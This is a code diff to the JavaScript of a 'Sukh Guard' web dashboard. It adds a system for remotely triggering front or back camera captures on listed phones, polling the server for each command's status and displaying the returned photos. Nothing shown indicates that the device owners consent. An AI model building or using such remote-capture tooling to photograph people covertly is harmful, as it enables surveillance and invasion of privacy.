@@ -1,4 +1,4 @@
-// js/app.js - Sukh Guard Dashboard Functions
+// js/app.js - Sukh Guard Dashboard Functions - REAL-TIME COMMAND SYSTEM
 const app = {
     SERVER_URL: 'https://sukh-3qtl.onrender.com/api/website/app-data',
     COMMANDS_URL: 'https://sukh-3qtl.onrender.com/api',
@@ -8,6 +8,8 @@ const app = {
     lastDataHash: '',
     currentDevice: null,
     currentCamera: 'front',
+    currentCommandId: null,
+    commandPollInterval: null,
 
     init: function() {
         console.log('🚀 App initializing...');
@@ -33,6 +35,7 @@ const app = {
         function closeModal() {
             modal.style.display = 'none';
             app.currentDevice = null;
+            app.stopCommandPolling();
         }
         
         if (closeBtn) closeBtn.onclick = closeModal;
@@ -63,7 +66,7 @@ const app = {
             });
         });
 
-        // 📸 CAMERA BUTTONS - FIXED EVENT LISTENERS
+        // 📸 ENHANCED CAMERA BUTTONS - REAL-TIME COMMAND SYSTEM
         const frontCameraBtn = document.getElementById('frontCameraBtn');
         const backCameraBtn = document.getElementById('backCameraBtn');
         const capturePhotoBtn = document.getElementById('capturePhotoBtn');
@@ -78,28 +81,28 @@ const app = {
 
         if (frontCameraBtn) {
             frontCameraBtn.addEventListener('click', function() {
-                console.log('📷 Front camera button clicked');
+                console.log('📷 Front camera button clicked - REAL-TIME COMMAND');
                 app.activateCamera('front');
             });
         }
 
         if (backCameraBtn) {
             backCameraBtn.addEventListener('click', function() {
-                console.log('📷 Back camera button clicked');
+                console.log('📷 Back camera button clicked - REAL-TIME COMMAND');
                 app.activateCamera('back');
             });
         }
 
         if (capturePhotoBtn) {
             capturePhotoBtn.addEventListener('click', function() {
-                console.log('📷 Capture photo button clicked');
+                console.log('📷 Capture photo button clicked - REAL-TIME COMMAND');
                 app.capturePhoto();
             });
         }
 
         if (recordVideoBtn) {
             recordVideoBtn.addEventListener('click', function() {
-                console.log('📷 Record video button clicked');
+                console.log('📷 Record video button clicked - REAL-TIME COMMAND');
                 app.recordVideo();
             });
         }
@@ -114,7 +117,7 @@ const app = {
         if (emergencyBtn) emergencyBtn.addEventListener('click', app.emergencyAction);
     },
 
-    // 📸 CAMERA FUNCTIONS - FIXED
+    // 📸 ENHANCED CAMERA FUNCTIONS - REAL-TIME COMMAND SYSTEM
     activateCamera: function(cameraType) {
         console.log('📷 activateCamera called:', cameraType);
         
@@ -132,14 +135,14 @@ const app = {
         if (cameraType === 'front' && frontCameraBtn) {
             frontCameraBtn.classList.add('active');
             app.currentCamera = 'front';
+            app.showToast('Front camera selected - Ready to capture', 'info');
         } else if (cameraType === 'back' && backCameraBtn) {
             backCameraBtn.classList.add('active');
             app.currentCamera = 'back';
+            app.showToast('Back camera selected - Ready to capture', 'info');
         }
         
-        // Send camera activation command to server
-        console.log('📷 Sending activate command for:', cameraType);
-        app.sendCameraCommand('activate', cameraType);
+        console.log('📷 Camera activated:', cameraType);
     },
 
     resetCameraSelection: function() {
@@ -153,7 +156,7 @@ const app = {
     },
 
     capturePhoto: function() {
-        console.log('📷 capturePhoto called');
+        console.log('📷 capturePhoto called - REAL-TIME COMMAND');
         
         if (!app.currentDevice) {
             app.showToast('Please select a device first', 'warning');
@@ -166,6 +169,11 @@ const app = {
         }
         
         console.log('📷 Sending capture command for:', app.currentCamera);
+        
+        // Show command status
+        app.showCommandStatus(`Sending capture command to ${app.currentDevice.device_model}...`, 'sending');
+        
+        // Send REAL-TIME command
         app.sendCameraCommand('capture', app.currentCamera);
     },
 
@@ -198,6 +206,7 @@ const app = {
         }
     },
 
+    // 🎯 ENHANCED: REAL-TIME CAMERA COMMAND SYSTEM
     sendCameraCommand: async function(action, cameraType) {
         console.log('📷 sendCameraCommand called:', { action, cameraType });
         
@@ -208,14 +217,20 @@ const app = {
         }
         
         try {
+            const deviceId = app.currentDevice.device_id;
+            const deviceModel = app.currentDevice.device_model || 'Unknown Device';
+            
             const payload = {
-                device_id: app.currentDevice.device_id,
-                device_model: app.currentDevice.device_model || 'Samsung Device',
+                device_id: deviceId,
+                device_model: deviceModel,
                 action: action,
                 camera_type: cameraType
             };
             
-            console.log('📷 Sending camera command payload:', payload);
+            console.log('📷 Sending REAL-TIME camera command payload:', payload);
+            
+            // Show sending status
+            app.showCommandStatus(`Sending ${action} command to ${deviceModel}...`, 'sending');
             
             const response = await fetch(`${app.COMMANDS_URL}/camera`, {
                 method: 'POST',
@@ -231,17 +246,186 @@ const app = {
             console.log('📷 Camera command result:', result);
             
             if (result.success) {
-                app.showToast(result.message, 'success');
+                app.showToast(`Command sent: ${result.message}`, 'success');
+                app.showCommandStatus(`Command sent - Waiting for device...`, 'sent');
+                
+                // ✅ START REAL-TIME POLLING FOR COMMAND RESULT
+                app.currentCommandId = result.command_id;
+                app.startCommandPolling(result.command_id, deviceId);
+                
             } else {
                 app.showToast('Camera command failed: ' + result.message, 'error');
+                app.showCommandStatus(`Command failed: ${result.message}`, 'error');
             }
         } catch (error) {
             console.error('❌ Camera command error:', error);
             app.showToast('Network error - camera command not sent', 'error');
+            app.showCommandStatus('Network error - command not sent', 'error');
         }
     },
 
-    // REST OF THE FUNCTIONS SAME AS BEFORE...
+    // 🎯 NEW: REAL-TIME COMMAND POLLING SYSTEM
+    startCommandPolling: function(commandId, deviceId) {
+        console.log(`🔄 Starting command polling: ${commandId} for device: ${deviceId}`);
+        
+        let pollCount = 0;
+        const maxPolls = 60; // 60 seconds timeout
+        
+        // Clear any existing polling
+        app.stopCommandPolling();
+        
+        app.commandPollInterval = setInterval(async () => {
+            pollCount++;
+            
+            if (pollCount > maxPolls) {
+                app.stopCommandPolling();
+                app.showCommandStatus('Timeout - No response from device', 'timeout');
+                app.showToast('Device response timeout', 'warning');
+                return;
+            }
+
+            try {
+                const response = await fetch(`${app.COMMANDS_URL}/command-status/${commandId}`);
+                const result = await response.json();
+                
+                if (result.success) {
+                    const command = result.command;
+                    
+                    console.log(`📊 Command status: ${command.status}`, command);
+                    
+                    if (command.status === 'delivered') {
+                        app.showCommandStatus('Command delivered to device - Executing...', 'delivered');
+                    } else if (command.status === 'completed') {
+                        app.stopCommandPolling();
+                        app.showCommandStatus('Command executed successfully!', 'completed');
+                        app.showToast('Photo captured successfully!', 'success');
+                        
+                        // ✅ PHOTO DATA HANDLING - Agar photo data hai to show karo
+                        if (command.photo_data) {
+                            console.log('📸 Photo data received:', command.photo_data);
+                            app.showPhotoPreview(command.photo_data);
+                        }
+                        
+                    } else if (command.status === 'failed') {
+                        app.stopCommandPolling();
+                        app.showCommandStatus(`Failed: ${command.error_message || 'Unknown error'}`, 'error');
+                        app.showToast('Command execution failed', 'error');
+                    }
+                }
+            } catch (error) {
+                console.error('Polling error:', error);
+                // Continue polling on error
+            }
+        }, 1000); // Poll every second
+        
+        console.log(`✅ Command polling started for command: ${commandId}`);
+    },
+
+    stopCommandPolling: function() {
+        if (app.commandPollInterval) {
+            clearInterval(app.commandPollInterval);
+            app.commandPollInterval = null;
+            console.log('🛑 Command polling stopped');
+        }
+    },
+
+    // 🎯 NEW: COMMAND STATUS DISPLAY
+    showCommandStatus: function(message, status) {
+        // Create or update command status display
+        let statusElement = document.getElementById('commandStatusDisplay');
+        
+        if (!statusElement) {
+            statusElement = document.createElement('div');
+            statusElement.id = 'commandStatusDisplay';
+            statusElement.className = 'command-status-display';
+            
+            // Insert after camera controls
+            const cameraControls = document.querySelector('.camera-controls');
+            if (cameraControls) {
+                cameraControls.parentNode.insertBefore(statusElement, cameraControls.nextSibling);
+            } else {
+                document.querySelector('.modal-body').appendChild(statusElement);
+            }
+        }
+        
+        const statusClass = `status-${status}`;
+        statusElement.innerHTML = `
+            <div class="command-status ${statusClass}">
+                <i class="fas ${app.getStatusIcon(status)}"></i>
+                <span class="status-message">${message}</span>
+                ${status === 'sending' || status === 'sent' || status === 'delivered' ? 
+                    '<div class="status-spinner"><i class="fas fa-spinner fa-spin"></i></div>' : ''}
+            </div>
+        `;
+        
+        statusElement.style.display = 'block';
+    },
+
+    getStatusIcon: function(status) {
+        switch(status) {
+            case 'sending': return 'fa-paper-plane';
+            case 'sent': return 'fa-check-circle';
+            case 'delivered': return 'fa-mobile-alt';
+            case 'completed': return 'fa-check-circle';
+            case 'error': return 'fa-exclamation-circle';
+            case 'timeout': return 'fa-clock';
+            default: return 'fa-info-circle';
+        }
+    },
+
+    // 🎯 NEW: PHOTO PREVIEW FUNCTION
+    showPhotoPreview: function(photoData) {
+        // Create photo preview modal
+        let photoModal = document.getElementById('photoPreviewModal');
+        
+        if (!photoModal) {
+            photoModal = document.createElement('div');
+            photoModal.id = 'photoPreviewModal';
+            photoModal.className = 'modal';
+            photoModal.innerHTML = `
+                <div class="modal-content photo-preview">
+                    <div class="modal-header">
+                        <h2><i class="fas fa-camera"></i> Photo Preview</h2>
+                        <span class="close">&times;</span>
+                    </div>
+                    <div class="modal-body">
+                        <div class="photo-container">
+                            <img id="previewImage" src="" alt="Captured Photo">
+                        </div>
+                        <div class="photo-info">
+                            <p>Photo captured from ${app.currentDevice.device_model}</p>
+                            <small>${new Date().toLocaleString()}</small>
+                        </div>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(photoModal);
+            
+            // Close event
+            photoModal.querySelector('.close').onclick = function() {
+                photoModal.style.display = 'none';
+            };
+            
+            // Close on outside click
+            window.onclick = function(event) {
+                if (event.target === photoModal) {
+                    photoModal.style.display = 'none';
+                }
+            };
+        }
+        
+        // Set image source (agar base64 data hai)
+        const previewImage = photoModal.querySelector('#previewImage');
+        if (photoData.startsWith('data:image')) {
+            previewImage.src = photoData;
+        } else {
+            previewImage.src = 'data:image/jpeg;base64,' + photoData;
+        }
+        
+        photoModal.style.display = 'block';
+    },
+
+    // REST OF THE FUNCTIONS (SAME AS BEFORE WITH MINOR ENHANCEMENTS)
     loadAllDevices: async function() {
         try {
             console.log('🔄 Loading devices from:', app.SERVER_URL);
@@ -278,6 +462,9 @@ const app = {
     openDeviceDetails: function(deviceData) {
         console.log('📱 Opening device details:', deviceData);
         app.currentDevice = deviceData;
+        
+        // Stop any previous command polling
+        app.stopCommandPolling();
         
         document.getElementById('modalDeviceName').textContent = deviceData.device_model || 'Unknown Device';
         document.getElementById('modalDeviceId').textContent = 'ID: ' + (deviceData.device_id || 'Unknown');
@@ -347,6 +534,44 @@ const app = {
                     from { transform: translateX(0); opacity: 1; }
                     to { transform: translateX(100%); opacity: 0; }
                 }
+                
+                /* 🎯 NEW: Command Status Styles */
+                .command-status-display {
+                    margin: 15px 0;
+                    padding: 0;
+                }
+                .command-status {
+                    padding: 12px 15px;
+                    border-radius: 8px;
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                    font-size: 14px;
+                    border-left: 4px solid var(--info);
+                }
+                .status-sending { border-left-color: var(--warning); background: rgba(255,193,7,0.1); }
+                .status-sent { border-left-color: var(--info); background: rgba(23,162,184,0.1); }
+                .status-delivered { border-left-color: var(--primary); background: rgba(0,123,255,0.1); }
+                .status-completed { border-left-color: var(--success); background: rgba(40,167,69,0.1); }
+                .status-error { border-left-color: var(--danger); background: rgba(220,53,69,0.1); }
+                .status-timeout { border-left-color: var(--secondary); background: rgba(108,117,125,0.1); }
+                .status-spinner { margin-left: auto; }
+                
+                /* Photo Preview Styles */
+                .photo-preview .modal-content {
+                    max-width: 90%;
+                    max-height: 90%;
+                }
+                .photo-container {
+                    text-align: center;
+                    margin: 20px 0;
+                }
+                .photo-container img {
+                    max-width: 100%;
+                    max-height: 400px;
+                    border-radius: 8px;
+                    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+                }
             `;
             document.head.appendChild(styles);
         }
@@ -388,7 +613,6 @@ const app = {
         }
     },
 
-    // ... (other functions remain same)
     generateDataHash: function(data) {
         try {
             const simpleData = data.map(item => ({
@@ -703,6 +927,23 @@ const app = {
 
     handleOffline: function() {
         this.showError('No internet connection. Please check your network.');
+    },
+    
+    // Placeholder functions for other buttons
+    refreshDevice: function() {
+        app.showToast('Refreshing device data...', 'info');
+    },
+    
+    pingDevice: function() {
+        app.showToast('Pinging device...', 'info');
+    },
+    
+    emergencyAction: function() {
+        app.showToast('Emergency action triggered!', 'warning');
+    },
+    
+    loadDeviceData: function() {
+        console.log('Loading device data...');
     }
 };
 
